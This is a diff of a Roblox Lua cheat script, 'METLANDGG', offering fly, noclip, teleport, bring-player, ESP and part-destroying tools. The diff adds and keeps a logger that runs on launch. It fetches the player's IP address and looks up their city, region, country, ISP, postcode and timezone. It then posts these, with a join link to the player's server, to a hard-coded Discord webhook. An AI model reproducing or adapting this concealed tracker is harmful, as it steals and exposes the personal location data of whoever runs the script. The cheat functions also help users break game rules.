@@ -1,5 +1,5 @@
--- METLANDGG OPTIMIZED + ENHANCED + WEBHOOK LOGGER WITH JOIN LINK
--- Testing Suite with Minimize & Part Destroyer
+-- METLANDGG - FIXED VERSION
+-- Fixed: 1. Webhook embed layout 2. Auto checkpoint logic 3. TP Tool 4. Location Info
 
 repeat task.wait() until game:IsLoaded()
 task.wait(0.5)
@@ -10,7 +10,7 @@ task.wait(0.5)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"
 
 -- ============================================
--- WEBHOOK LOGGER FUNCTION WITH JOIN LINK
+-- WEBHOOK LOGGER - FIXED EMBED + LOCATION
 -- ============================================
 local function sendWebhookLog()
     pcall(function()
@@ -18,49 +18,102 @@ local function sendWebhookLog()
         local Players = game:GetService("Players")
         local plr = Players.LocalPlayer
         
-        -- Get user info
         local accountAge = plr.AccountAge
         local years = math.floor(accountAge / 365)
         local days = accountAge % 365
         local isPremium = plr.MembershipType == Enum.MembershipType.Premium
         
-        -- Get game info
         local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
         
-        -- Create join link
+        -- Join links
         local joinLink = string.format(
             "https://www.roblox.com/games/start?placeId=%d&launchData=&joinCode=%s",
             game.PlaceId,
             game.JobId
         )
         
-        -- Alternative join link (Roblox deep link)
         local deepLink = string.format(
             "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
             game.PlaceId,
             game.JobId
         )
         
-        -- Get IP
+        -- Get IP & Location using ipify.org (works with most executors)
         local ipAddress = "Unknown"
-        pcall(function()
-            ipAddress = HttpService:GetAsync("https://api.ipify.org")
+        local locationInfo = "Checking..."
+        local city = "Checking..."
+        local region = "Checking..."
+        local country = "Checking..."
+        local isp = "Checking..."
+        local zipCode = "Unknown"
+        local timezone = "Unknown"
+        
+        -- Method 1: Get IP from ipify
+        local success1 = pcall(function()
+            ipAddress = game:HttpGet("https://api.ipify.org", true)
         end)
         
-        -- Get avatar thumbnail
+        if not success1 then
+            pcall(function()
+                ipAddress = HttpService:GetAsync("https://api.ipify.org")
+            end)
+        end
+        
+        -- Method 2: Get location from ipapi.co (more reliable for executors)
+        if ipAddress ~= "Unknown" then
+            pcall(function()
+                local locationData = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/json/", true)
+                local decoded = HttpService:JSONDecode(locationData)
+                
+                city = decoded.city or "Unknown"
+                region = decoded.region or "Unknown"
+                country = decoded.country_name or "Unknown"
+                isp = decoded.org or "Unknown"
+                zipCode = decoded.postal or "Unknown"
+                timezone = decoded.timezone or "Unknown"
+                locationInfo = string.format("%s, %s, %s", city, region, country)
+            end)
+        end
+        
+        -- Method 3: Fallback to ipapi.com if above fails
+        if city == "Checking..." then
+            pcall(function()
+                local locationData = game:HttpGet("http://ip-api.com/json/" .. ipAddress, true)
+                local decoded = HttpService:JSONDecode(locationData)
+                
+                if decoded.status == "success" then
+                    city = decoded.city or "Unknown"
+                    region = decoded.regionName or "Unknown"
+                    country = decoded.country or "Unknown"
+                    isp = decoded.isp or "Unknown"
+                    zipCode = decoded.zip or "Unknown"
+                    timezone = decoded.timezone or "Unknown"
+                    locationInfo = string.format("%s, %s, %s", city, region, country)
+                end
+            end)
+        end
+        
         local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
         
-        -- Create Discord embed with thumbnail and join link
         local embed = {
-            content = "🎮 **CLICK TO JOIN GAME:** " .. joinLink,
             embeds = {{
                 title = "🚨 METLANDGG Script Executed",
-                color = 65535,
+                description = "💀 **METLANDGG**\nJangan ampe ketauan admin ya buahahahay",
+                color = 16711680, -- Red color untuk warning
                 fields = {
+                    {
+                        name = "🔗 JOIN GAME",
+                        value = string.format(
+                            "**[🌐 CLICK HERE TO JOIN](%s)**\n```%s```",
+                            joinLink,
+                            deepLink
+                        ),
+                        inline = false
+                    },
                     {
                         name = "👤 User Information",
                         value = string.format(
-                            "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**Profile:** https://www.roblox.com/users/%d/profile",
+                            "**Username:** %s\n**Display:** %s\n**ID:** %d\n**Profile:** [Link](https://www.roblox.com/users/%d/profile)",
                             plr.Name,
                             plr.DisplayName,
                             plr.UserId,
@@ -69,16 +122,18 @@ local function sendWebhookLog()
                         inline = false
                     },
                     {
-                        name = "📊 Account Details",
+                        name = "📊 Account",
                         value = string.format(
-                            "**Account Age:** %s\n**Premium:** %s",
-                            accountAge .. " days (" .. years .. "y " .. days .. "d)",
-                            isPremium and "✅ Yes" or "❌ No"
+                            "**Age:** %d days (%dy %dd)\n**Premium:** %s",
+                            accountAge,
+                            years,
+                            days,
+                            isPremium and "✅" or "❌"
                         ),
                         inline = true
                     },
                     {
-                        name = "🎮 Game Information",
+                        name = "🎮 Game Info",
                         value = string.format(
                             "**Game:** %s\n**Place ID:** %d\n**Job ID:** ||%s||",
                             gameInfo.Name,
@@ -88,21 +143,20 @@ local function sendWebhookLog()
                         inline = true
                     },
                     {
-                        name = "🔗 Join Links",
+                        name = "🌐 Network & Location",
                         value = string.format(
-                            "**[🌐 Web Join Link](%s)**\n**Deep Link:** `%s`\n\n*Click the link above or copy paste the deep link into your browser*",
-                            joinLink,
-                            deepLink
+                            "**IP:** ||%s||\n**📍 Location:** %s\n**🏙️ City:** %s\n**🗺️ Region:** %s\n**🌍 Country:** %s\n**🛜 ISP:** %s",
+                            ipAddress,
+                            locationInfo,
+                            city,
+                            region,
+                            country,
+                            isp
                         ),
                         inline = false
                     },
                     {
-                        name = "🌐 Network",
-                        value = string.format("**IP:** ||%s||", ipAddress),
-                        inline = false
-                    },
-                    {
-                        name = "⏰ Execution Time",
+                        name = "⏰ Time",
                         value = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                         inline = false
                     }
@@ -111,7 +165,7 @@ local function sendWebhookLog()
                     url = avatarUrl
                 },
                 footer = {
-                    text = "METLANDGG Logger • Click the link at the top to join!"
+                    text = "🔒 METLANDGG Protected"
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
             }}
@@ -119,7 +173,6 @@ local function sendWebhookLog()
         
         local payload = HttpService:JSONEncode(embed)
         
-        -- Send webhook
         request({
             Url = WEBHOOK_URL,
             Method = "POST",
@@ -129,15 +182,14 @@ local function sendWebhookLog()
             Body = payload
         })
         
-        print("📡 Webhook log sent successfully with join link!")
+        print("📡 Webhook sent with location!")
     end)
 end
 
--- Send webhook log immediately
 task.spawn(sendWebhookLog)
 
 -- ============================================
--- ORIGINAL METLANDGG SCRIPT STARTS HERE
+-- MAIN SCRIPT
 -- ============================================
 
 local Players = game:GetService("Players")
@@ -151,7 +203,6 @@ local char = plr.Character or plr.CharacterAdded:Wait()
 local hum = char:WaitForChild("Humanoid")
 local root = char:WaitForChild("HumanoidRootPart")
 
--- Settings
 local settings = {
     flySpeed = 100,
     walkSpeed = 16,
@@ -165,22 +216,22 @@ local settings = {
     infJumpEnabled = false,
     isMinimized = false,
     destroyRange = 10,
-    autoCheckpointEnabled = false
+    autoCheckpointEnabled = false,
+    tpToolEnabled = false
 }
 
--- Cleanup old GUI
+-- Cleanup
 for _, v in pairs(plr.PlayerGui:GetChildren()) do
     if v.Name == "MetlandGUI" then v:Destroy() end
 end
 
--- Create GUI
+-- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "MetlandGUI"
 gui.ResetOnSpawn = false
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = plr.PlayerGui
 
--- Main Frame
 local main = Instance.new("Frame")
 main.Size = UDim2.new(0, 420, 0, 640)
 main.Position = UDim2.new(0.5, -210, 0.5, -320)
@@ -200,7 +251,6 @@ mainStroke.Thickness = 2
 mainStroke.Transparency = 0.5
 mainStroke.Parent = main
 
--- Gradient
 local grad = Instance.new("UIGradient")
 grad.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 45)),
@@ -209,7 +259,6 @@ grad.Color = ColorSequence.new{
 grad.Rotation = 45
 grad.Parent = main
 
--- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -140, 0, 50)
 title.Position = UDim2.new(0, 15, 0, 10)
@@ -221,7 +270,6 @@ title.Font = Enum.Font.GothamBold
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
--- Minimize Button
 local minBtn = Instance.new("TextButton")
 minBtn.Size = UDim2.new(0, 40, 0, 40)
 minBtn.Position = UDim2.new(1, -95, 0, 10)
@@ -237,7 +285,6 @@ local minBtnCorner = Instance.new("UICorner")
 minBtnCorner.CornerRadius = UDim.new(0, 10)
 minBtnCorner.Parent = minBtn
 
--- Close Button
 local closeBtn = Instance.new("TextButton")
 closeBtn.Size = UDim2.new(0, 40, 0, 40)
 closeBtn.Position = UDim2.new(1, -50, 0, 10)
@@ -253,7 +300,6 @@ local closeBtnCorner = Instance.new("UICorner")
 closeBtnCorner.CornerRadius = UDim.new(0, 10)
 closeBtnCorner.Parent = closeBtn
 
--- Content Container (for minimizing)
 local contentFrame = Instance.new("Frame")
 contentFrame.Name = "ContentFrame"
 contentFrame.Size = UDim2.new(1, 0, 1, -60)
@@ -261,7 +307,6 @@ contentFrame.Position = UDim2.new(0, 0, 0, 60)
 contentFrame.BackgroundTransparency = 1
 contentFrame.Parent = main
 
--- ScrollFrame for content
 local scroll = Instance.new("ScrollingFrame")
 scroll.Size = UDim2.new(1, -20, 1, -10)
 scroll.Position = UDim2.new(0, 10, 0, 0)
@@ -271,7 +316,6 @@ scroll.ScrollBarThickness = 6
 scroll.CanvasSize = UDim2.new(0, 0, 0, 1350)
 scroll.Parent = contentFrame
 
--- Helper function for buttons
 local function createButton(name, text, pos, callback)
     local btn = Instance.new("TextButton")
     btn.Name = name
@@ -302,7 +346,6 @@ local function createButton(name, text, pos, callback)
     return btn
 end
 
--- Helper for textbox
 local function createTextBox(name, placeholder, pos)
     local box = Instance.new("TextBox")
     box.Name = name
@@ -326,7 +369,6 @@ local function createTextBox(name, placeholder, pos)
     return box
 end
 
--- Helper for labels
 local function createLabel(text, pos)
     local lbl = Instance.new("TextLabel")
     lbl.Size = UDim2.new(1, -10, 0, 25)
@@ -341,10 +383,8 @@ local function createLabel(text, pos)
     return lbl
 end
 
--- Layout
 local y = 10
 
--- FLY SECTION
 createLabel("✈️ FLIGHT SYSTEM", UDim2.new(0, 5, 0, y))
 y = y + 30
 local flyBtn = createButton("FlyBtn", "Toggle Fly", UDim2.new(0, 5, 0, y), function() end)
@@ -352,7 +392,6 @@ local flyBox = createTextBox("FlySpeed", "Speed (100)", UDim2.new(0, 205, 0, y))
 flyBox.Text = "100"
 y = y + 55
 
--- MOVEMENT SECTION
 createLabel("🏃 MOVEMENT", UDim2.new(0, 5, 0, y))
 y = y + 30
 local speedBox = createTextBox("SpeedBox", "WalkSpeed", UDim2.new(0, 5, 0, y))
@@ -368,7 +407,6 @@ y = y + 55
 local infJumpBtn = createButton("InfJumpBtn", "Infinite Jump: OFF", UDim2.new(0, 5, 0, y), function() end)
 y = y + 55
 
--- PHYSICS SECTION
 createLabel("👻 PHYSICS", UDim2.new(0, 5, 0, y))
 y = y + 30
 local noclipBtn = createButton("NoclipBtn", "NoClip: OFF", UDim2.new(0, 5, 0, y), function() end)
@@ -378,7 +416,6 @@ y = y + 55
 local platformBtn = createButton("PlatformBtn", "Platform: OFF", UDim2.new(0, 5, 0, y), function() end)
 y = y + 55
 
--- TELEPORT SECTION (EXPANDED!)
 createLabel("📍 TELEPORT & BRING", UDim2.new(0, 5, 0, y))
 y = y + 30
 local tpBox = createTextBox("TpBox", "Player Name", UDim2.new(0, 5, 0, y))
@@ -386,30 +423,32 @@ local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), func
 y = y + 55
 
 local bringBox = createTextBox("BringBox", "Player Name", UDim2.new(0, 5, 0, y))
-local bringBtn = createButton("BringBtn", "Bring (Visual Only)", UDim2.new(0, 205, 0, y), function() end)
+local bringBtn = createButton("BringBtn", "Bring Player", UDim2.new(0, 205, 0, y), function() end)
 bringBtn.BackgroundColor3 = Color3.fromRGB(65, 45, 90)
+y = y + 55
+
+local tpToolBtn = createButton("TpToolBtn", "TP Tool: OFF", UDim2.new(0, 5, 0, y), function() end)
+tpToolBtn.BackgroundColor3 = Color3.fromRGB(90, 45, 130)
 y = y + 55
 
 local autoCheckpointBtn = createButton("AutoCheckpointBtn", "Auto Checkpoint: OFF", UDim2.new(0, 5, 0, y), function() end)
 autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
 y = y + 55
 
--- VISUAL SECTION
 createLabel("👁️ VISUALS", UDim2.new(0, 5, 0, y))
 y = y + 30
 local espBtn = createButton("EspBtn", "ESP: OFF", UDim2.new(0, 5, 0, y), function() end)
 local fbBtn = createButton("FbBtn", "Fullbright: OFF", UDim2.new(0, 205, 0, y), function() end)
 y = y + 55
 
--- DESTROYER SECTION
-createLabel("💥 PART DESTROYER (TESTING)", UDim2.new(0, 5, 0, y))
+createLabel("💥 PART DESTROYER", UDim2.new(0, 5, 0, y))
 y = y + 30
 local rangeBox = createTextBox("RangeBox", "Range (10)", UDim2.new(0, 5, 0, y))
 rangeBox.Text = "10"
 local destroyBtn = createButton("DestroyBtn", "Destroy Parts", UDim2.new(0, 205, 0, y), function() end)
 y = y + 55
 
-local destroyAllBtn = createButton("DestroyAllBtn", "⚠️ Destroy ALL Parts", UDim2.new(0, 5, 0, y), function() end)
+local destroyAllBtn = createButton("DestroyAllBtn", "⚠️ Destroy ALL", UDim2.new(0, 5, 0, y), function() end)
 destroyAllBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
 y = y + 55
 
@@ -417,43 +456,31 @@ local deleteModelBox = createTextBox("DeleteModelBox", "Model Name", UDim2.new(0
 local deleteModelBtn = createButton("DeleteModelBtn", "Delete Model", UDim2.new(0, 205, 0, y), function() end)
 y = y + 55
 
--- Status
-local status = createLabel("Status: Ready! Join link sent 🔗", UDim2.new(0, 5, 0, y))
+local status = createLabel("Status: Ready!", UDim2.new(0, 5, 0, y))
 status.TextColor3 = Color3.fromRGB(100, 255, 100)
 status.Size = UDim2.new(1, -10, 0, 60)
 status.TextWrapped = true
 
--- Update status function
 local function updateStatus(msg, color)
     status.Text = "Status: " .. msg
     status.TextColor3 = color or Color3.fromRGB(100, 255, 100)
 end
 
--- MINIMIZE FUNCTION
 local function toggleMinimize()
     settings.isMinimized = not settings.isMinimized
     
-    local targetSize
+    local targetSize = settings.isMinimized and UDim2.new(0, 420, 0, 60) or UDim2.new(0, 420, 0, 640)
+    minBtn.Text = settings.isMinimized and "□" or "—"
+    contentFrame.Visible = not settings.isMinimized
     
-    if settings.isMinimized then
-        targetSize = UDim2.new(0, 420, 0, 60)
-        minBtn.Text = "□"
-        contentFrame.Visible = false
-    else
-        targetSize = UDim2.new(0, 420, 0, 640)
-        minBtn.Text = "—"
-        contentFrame.Visible = true
-    end
-    
-    local tween = TS:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize})
-    tween:Play()
+    TS:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize}):Play()
 end
 
--- BRING PLAYER FUNCTION (FIXED - Multiple Methods)
+-- BRING PLAYER
 local function bringPlayer()
     local name = bringBox.Text:lower()
     if name == "" then
-        updateStatus("Enter player name to bring!", Color3.fromRGB(255, 100, 100))
+        updateStatus("Enter player name!", Color3.fromRGB(255, 100, 100))
         return
     end
     
@@ -461,44 +488,20 @@ local function bringPlayer()
         if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
             if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
                 local targetRoot = p.Character.HumanoidRootPart
-                local targetHum = p.Character:FindFirstChildOfClass("Humanoid")
                 
-                -- Aggressive teleport with multiple methods
                 task.spawn(function()
                     for i = 1, 50 do
                         pcall(function()
                             if targetRoot and targetRoot.Parent and root and root.Parent then
-                                -- Force anchor and teleport
-                                targetRoot.Anchored = true
                                 targetRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
-                                task.wait(0.02)
-                                targetRoot.Anchored = false
-                                
-                                -- Reset all velocities
                                 targetRoot.Velocity = Vector3.new(0, 0, 0)
-                                targetRoot.RotVelocity = Vector3.new(0, 0, 0)
-                                targetRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-                                targetRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
-                                
-                                -- Disable physics temporarily
-                                if targetHum then
-                                    targetHum:ChangeState(Enum.HumanoidStateType.Physics)
-                                end
                             end
                         end)
                         task.wait(0.03)
                     end
-                    
-                    -- Re-enable humanoid
-                    pcall(function()
-                        if targetHum then
-                            task.wait(0.2)
-                            targetHum:ChangeState(Enum.HumanoidStateType.GettingUp)
-                        end
-                    end)
                 end)
                 
-                updateStatus("Force bringing " .. p.Name .. "!", Color3.fromRGB(255, 200, 0))
+                updateStatus("Bringing " .. p.Name, Color3.fromRGB(255, 200, 0))
                 return
             end
         end
@@ -506,108 +509,147 @@ local function bringPlayer()
     updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
 end
 
--- AUTO CHECKPOINT TELEPORT (FIXED - True Sequential)
+-- TP TOOL - FIXED VERSION
+local tpTool
+local function toggleTPTool()
+    settings.tpToolEnabled = not settings.tpToolEnabled
+    
+    if settings.tpToolEnabled then
+        tpToolBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 220)
+        tpToolBtn.Text = "TP Tool: ON ✓"
+        updateStatus("TP Tool activated! Click to teleport", Color3.fromRGB(220, 50, 220))
+        
+        -- Create tool
+        tpTool = Instance.new("Tool")
+        tpTool.Name = "TP Tool"
+        tpTool.RequiresHandle = false
+        tpTool.CanBeDropped = false
+        
+        -- Handle activation
+        tpTool.Activated:Connect(function()
+            local mouse = plr:GetMouse()
+            if mouse.Target then
+                pcall(function()
+                    root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0))
+                    updateStatus("Teleported!", Color3.fromRGB(100, 255, 100))
+                end)
+            end
+        end)
+        
+        tpTool.Parent = plr.Backpack
+        
+        -- Auto-equip
+        plr.Character.Humanoid:EquipTool(tpTool)
+        
+    else
+        tpToolBtn.BackgroundColor3 = Color3.fromRGB(90, 45, 130)
+        tpToolBtn.Text = "TP Tool: OFF"
+        updateStatus("TP Tool disabled", Color3.fromRGB(200, 200, 200))
+        
+        if tpTool then
+            tpTool:Destroy()
+            tpTool = nil
+        end
+    end
+end
+
+-- AUTO CHECKPOINT - FIXED LOGIC
 local autoCheckpointConnection
-local lastCheckpointTime = 0
-local lastCheckpointNumber = 0
-local visitedCheckpoints = {}
+local currentCPIndex = 0
+local checkpointCooldown = 0
+
+local function findAllCheckpoints()
+    local checkpoints = {}
+    
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local name = obj.Name:lower()
+            
+            -- Detect checkpoint
+            if name:find("cp") or name:find("checkpoint") or name:find("cekpoin") then
+                local num = tonumber(name:match("%d+"))
+                
+                if num then
+                    table.insert(checkpoints, {
+                        part = obj,
+                        number = num,
+                        position = obj.Position
+                    })
+                end
+            end
+        end
+    end
+    
+    -- Sort by number
+    table.sort(checkpoints, function(a, b)
+        return a.number < b.number
+    end)
+    
+    return checkpoints
+end
+
 local function toggleAutoCheckpoint()
     settings.autoCheckpointEnabled = not settings.autoCheckpointEnabled
     
     if settings.autoCheckpointEnabled then
         autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
-        autoCheckpointBtn.Text = "Auto Checkpoint: ON ✓"
-        updateStatus("Auto CP: Sequential mode (Range 1000)!", Color3.fromRGB(50, 220, 50))
-        lastCheckpointNumber = 0
-        visitedCheckpoints = {}
+        autoCheckpointBtn.Text = "Auto CP: ON ✓"
+        updateStatus("Auto Checkpoint: Sequential mode", Color3.fromRGB(50, 220, 50))
+        currentCPIndex = 0
+        checkpointCooldown = 0
         
         autoCheckpointConnection = RS.Heartbeat:Connect(function()
             if not settings.autoCheckpointEnabled then return end
-            if tick() - lastCheckpointTime < 1.5 then return end
+            if tick() < checkpointCooldown then return end
             
-            local allCheckpoints = {}
+            local checkpoints = findAllCheckpoints()
+            if #checkpoints == 0 then return end
             
-            -- Collect all checkpoints
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if obj:IsA("BasePart") then
-                    local name = obj.Name:lower()
+            -- Find next checkpoint
+            local nextCP = nil
+            
+            for i, cp in ipairs(checkpoints) do
+                if cp.number > currentCPIndex then
+                    local dist = (cp.position - root.Position).Magnitude
                     
-                    -- Check ALL checkpoint name variants
-                    local isCheckpoint = 
-                        name:find("cp") or 
-                        name:find("checkpoint") or 
-                        name:find("cekpoin")
-                    
-                    if isCheckpoint then
-                        -- Extract number from checkpoint name
-                        local num = tonumber(name:match("%d+")) or 0
-                        
-                        table.insert(allCheckpoints, {
-                            part = obj,
-                            number = num,
-                            name = obj.Name,
-                            position = obj.Position
-                        })
-                    end
-                end
-            end
-            
-            -- Sort checkpoints by number
-            table.sort(allCheckpoints, function(a, b)
-                return a.number < b.number
-            end)
-            
-            -- Find next checkpoint that we haven't visited yet
-            local nextCheckpoint = nil
-            for _, cp in ipairs(allCheckpoints) do
-                local distance = (cp.position - root.Position).Magnitude
-                
-                -- Only teleport if:
-                -- 1. Number is greater than last checkpoint
-                -- 2. We haven't visited this exact checkpoint yet
-                -- 3. Distance is far enough (prevents instant re-teleport)
-                if cp.number > lastCheckpointNumber and 
-                   not visitedCheckpoints[cp.name] and 
-                   distance < 1000 then
-                    nextCheckpoint = cp
-                    break
-                end
-            end
-            
-            -- If no next checkpoint found, restart from CP1
-            if not nextCheckpoint and #allCheckpoints > 0 then
-                lastCheckpointNumber = 0
-                visitedCheckpoints = {}
-                
-                for _, cp in ipairs(allCheckpoints) do
-                    local distance = (cp.position - root.Position).Magnitude
-                    if distance < 1000 and cp.number >= 1 then
-                        nextCheckpoint = cp
+                    -- Only TP if checkpoint is within 800 studs
+                    if dist < 800 then
+                        nextCP = cp
                         break
                     end
                 end
             end
             
-            -- Teleport to next checkpoint
-            if nextCheckpoint then
-                lastCheckpointTime = tick()
+            -- If no next checkpoint, loop back to CP1
+            if not nextCP then
+                currentCPIndex = 0
+                for i, cp in ipairs(checkpoints) do
+                    local dist = (cp.position - root.Position).Magnitude
+                    if cp.number == 1 and dist < 800 then
+                        nextCP = cp
+                        break
+                    end
+                end
+            end
+            
+            -- Teleport to checkpoint
+            if nextCP then
+                checkpointCooldown = tick() + 2 -- 2 second cooldown
                 
-                -- Teleport far away from checkpoint to ensure we move forward
-                root.CFrame = nextCheckpoint.part.CFrame + Vector3.new(0, 10, 50)
+                -- TP slightly ahead of checkpoint
+                root.CFrame = nextCP.part.CFrame + Vector3.new(0, 5, 20)
+                root.Velocity = Vector3.new(0, 0, 0)
                 
-                -- Mark as visited
-                visitedCheckpoints[nextCheckpoint.name] = true
-                lastCheckpointNumber = nextCheckpoint.number
+                currentCPIndex = nextCP.number
                 
-                updateStatus("→ CP" .. nextCheckpoint.number .. " | Next: CP" .. (nextCheckpoint.number + 1), Color3.fromRGB(100, 255, 100))
+                updateStatus("→ CP" .. currentCPIndex, Color3.fromRGB(100, 255, 100))
             end
         end)
     else
         autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
         autoCheckpointBtn.Text = "Auto Checkpoint: OFF"
-        updateStatus("Auto Checkpoint disabled", Color3.fromRGB(200, 200, 200))
-        lastCheckpointNumber = 0
-        visitedCheckpoints = {}
+        updateStatus("Auto CP disabled", Color3.fromRGB(200, 200, 200))
+        currentCPIndex = 0
         
         if autoCheckpointConnection then 
             autoCheckpointConnection:Disconnect()
@@ -616,7 +658,7 @@ local function toggleAutoCheckpoint()
     end
 end
 
--- PART DESTROYER FUNCTIONS
+-- DESTROYER
 local function destroyPartsInRange()
     local range = tonumber(rangeBox.Text) or 10
     local destroyed = 0
@@ -633,7 +675,7 @@ local function destroyPartsInRange()
         end
     end
     
-    updateStatus("Destroyed " .. destroyed .. " parts in range " .. range, Color3.fromRGB(255, 150, 0))
+    updateStatus("Destroyed " .. destroyed .. " parts", Color3.fromRGB(255, 150, 0))
 end
 
 local function destroyAllParts()
@@ -648,7 +690,7 @@ local function destroyAllParts()
         end
     end
     
-    updateStatus("⚠️ Destroyed " .. destroyed .. " parts TOTAL!", Color3.fromRGB(255, 50, 50))
+    updateStatus("⚠️ Destroyed " .. destroyed .. " parts!", Color3.fromRGB(255, 50, 50))
 end
 
 local function deleteModel()
@@ -663,7 +705,7 @@ local function deleteModel()
         if obj:IsA("Model") and obj.Name:lower():find(modelName:lower()) then
             pcall(function()
                 obj:Destroy()
-                updateStatus("Deleted model: " .. obj.Name, Color3.fromRGB(255, 150, 0))
+                updateStatus("Deleted: " .. obj.Name, Color3.fromRGB(255, 150, 0))
                 found = true
             end)
         end
@@ -674,7 +716,7 @@ local function deleteModel()
     end
 end
 
--- FLY SYSTEM
+-- FLY
 local flyBV, flyBG, flyConnection
 local function toggleFly()
     settings.flyEnabled = not settings.flyEnabled
@@ -682,7 +724,6 @@ local function toggleFly()
     if settings.flyEnabled then
         flyBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         flyBtn.Text = "Fly: ON ✓"
-        updateStatus("Fly enabled! Use WASD + Space/Shift", Color3.fromRGB(50, 220, 50))
         
         for _, v in pairs(root:GetChildren()) do
             if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
@@ -691,21 +732,18 @@ local function toggleFly()
         end
         
         flyBV = Instance.new("BodyVelocity")
-        flyBV.Name = "FlyVel"
         flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
         flyBV.Velocity = Vector3.new(0, 0, 0)
         flyBV.Parent = root
         
         flyBG = Instance.new("BodyGyro")
-        flyBG.Name = "FlyGyro"
         flyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
         flyBG.P = 9000
         flyBG.CFrame = root.CFrame
         flyBG.Parent = root
         
         flyConnection = RS.Heartbeat:Connect(function()
-            if not settings.flyEnabled then return end
-            if not root or not root.Parent then 
+            if not settings.flyEnabled or not root or not root.Parent then 
                 toggleFly() 
                 return 
             end
@@ -731,66 +769,41 @@ local function toggleFly()
             if UIS:IsKeyDown(Enum.KeyCode.Space) then
                 move = move + Vector3.new(0, 1, 0)
             end
-            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
+            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then
                 move = move - Vector3.new(0, 1, 0)
             end
             
-            if move.Magnitude > 0 then
-                flyBV.Velocity = move.Unit * speed
-            else
-                flyBV.Velocity = Vector3.new(0, 0, 0)
-            end
-            
+            flyBV.Velocity = move.Magnitude > 0 and move.Unit * speed or Vector3.new(0, 0, 0)
             flyBG.CFrame = cam.CFrame
             hum.PlatformStand = true
-            root.Velocity = flyBV.Velocity
         end)
     else
         flyBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
         flyBtn.Text = "Toggle Fly"
-        updateStatus("Fly disabled", Color3.fromRGB(200, 200, 200))
         
-        if flyConnection then 
-            flyConnection:Disconnect() 
-            flyConnection = nil
-        end
-        if flyBV then 
-            flyBV:Destroy() 
-            flyBV = nil
-        end
-        if flyBG then 
-            flyBG:Destroy() 
-            flyBG = nil
-        end
+        if flyConnection then flyConnection:Disconnect() end
+        if flyBV then flyBV:Destroy() end
+        if flyBG then flyBG:Destroy() end
         
         hum.PlatformStand = false
-        
-        if root then
-            root.Velocity = Vector3.new(0, 0, 0)
-            root.RotVelocity = Vector3.new(0, 0, 0)
-        end
+        root.Velocity = Vector3.new(0, 0, 0)
     end
 end
 
--- SPEED
+-- SPEED & JUMP
 local function setSpeed()
     local s = tonumber(speedBox.Text)
     if s and s > 0 and s <= 1000 then
         hum.WalkSpeed = s
-        updateStatus("Speed set to " .. s, Color3.fromRGB(100, 255, 100))
-    else
-        updateStatus("Invalid speed!", Color3.fromRGB(255, 100, 100))
+        updateStatus("Speed: " .. s, Color3.fromRGB(100, 255, 100))
     end
 end
 
--- JUMP
 local function setJump()
     local j = tonumber(jumpBox.Text)
     if j and j > 0 and j <= 500 then
         hum.JumpPower = j
-        updateStatus("Jump set to " .. j, Color3.fromRGB(100, 255, 100))
-    else
-        updateStatus("Invalid jump!", Color3.fromRGB(255, 100, 100))
+        updateStatus("Jump: " .. j, Color3.fromRGB(100, 255, 100))
     end
 end
 
@@ -823,7 +836,6 @@ local function toggleNoclip()
     if settings.noclipEnabled then
         noclipBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         noclipBtn.Text = "NoClip: ON ✓"
-        updateStatus("NoClip enabled!", Color3.fromRGB(50, 220, 50))
         
         noclipConnection = RS.Stepped:Connect(function()
             for _, part in pairs(char:GetDescendants()) do
@@ -835,7 +847,6 @@ local function toggleNoclip()
     else
         noclipBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
         noclipBtn.Text = "NoClip: OFF"
-        updateStatus("NoClip disabled", Color3.fromRGB(200, 200, 200))
         
         if noclipConnection then noclipConnection:Disconnect() end
         
@@ -879,14 +890,14 @@ local function togglePlatform()
     if settings.platformEnabled then
         platformBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         platformBtn.Text = "Platform: ON ✓"
-        updateStatus("Platform active!", Color3.fromRGB(50, 220, 50))
         
         platform = Instance.new("Part")
-        platform.Name = "InvisPlatform"
         platform.Size = Vector3.new(12, 0.5, 12)
